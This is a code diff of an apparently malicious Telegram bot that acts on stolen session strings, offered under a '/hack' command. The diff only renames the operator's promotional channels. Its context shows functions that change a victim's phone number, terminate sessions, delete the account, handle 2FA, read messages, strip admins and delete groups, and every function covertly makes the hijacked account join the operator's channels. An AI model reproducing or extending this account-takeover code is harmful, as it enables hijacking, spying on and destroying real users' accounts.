@@ -28,11 +28,11 @@ async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@Legend_K_UserBot"))
+      await bot(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await bot(join("@Official_K_LegendBot"))
+      await bot(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -57,11 +57,11 @@ async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@Legend_K_UserBot"))
+      await bot(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await bot(join("@Official_K_LegendBot"))
+      await bot(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -87,11 +87,11 @@ async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -107,11 +107,11 @@ async def userinfo(strses):
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -132,11 +132,11 @@ async def delacc(strses):
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_K_UserBot"))
+      await X(leave("@LegendBot_OP"))
     except BaseException:
       pass
     await X(functions.account.DeleteAccountRequest("I am chutia"))
@@ -144,11 +144,11 @@ async def delacc(strses):
 async def promote(strses, grp, user):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -167,11 +167,11 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -191,11 +191,11 @@ async def user2fa(strses):
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -217,11 +217,11 @@ async def demall(strses, grp):
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -237,11 +237,11 @@ async def joingroup(strses, username):
 async def leavegroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -257,11 +257,11 @@ async def leavegroup(strses, username):
 async def delgroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -287,11 +287,11 @@ async def usermsgs(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -311,11 +311,11 @@ async def usermsgs(strses):
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -338,11 +338,11 @@ async def userbans(strses, grp):
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_K_UserBot"))
+      await X(join("@LegendBot_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@Official_K_LegendBot"))
+      await X(join("@LegendBot_AI"))
     except BaseException:
       pass
     try:
@@ -367,7 +367,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "Official_K_LegendBot"
+channel = "LegendBot_AI"
 menu = '''
 
 "A" :~ [Check user own groups and channels]
@@ -440,7 +440,7 @@ async def op(event):
   else:
     legendbye = [
       [
-        Button.url("Must Join", f"https://t.me/Official_K_LegendBot")
+        Button.url("Must Join", f"https://t.me/LegendBot_AI")
         ]
       ]
     await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
